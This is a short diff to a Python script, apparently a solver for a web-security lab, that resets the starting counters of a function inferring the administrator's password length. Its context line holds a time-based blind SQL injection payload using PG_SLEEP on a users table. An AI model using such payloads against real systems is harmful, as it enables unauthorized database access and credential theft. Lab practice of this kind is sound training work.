@@ -8,8 +8,8 @@ from halo import Halo
 
 
 def get_password_length(url, trackingId, session):
-  password_length = 19
-  i = 19
+  password_length = 0
+  i = 0
 
   while True:
     payload = f"'; SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = {i}) THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
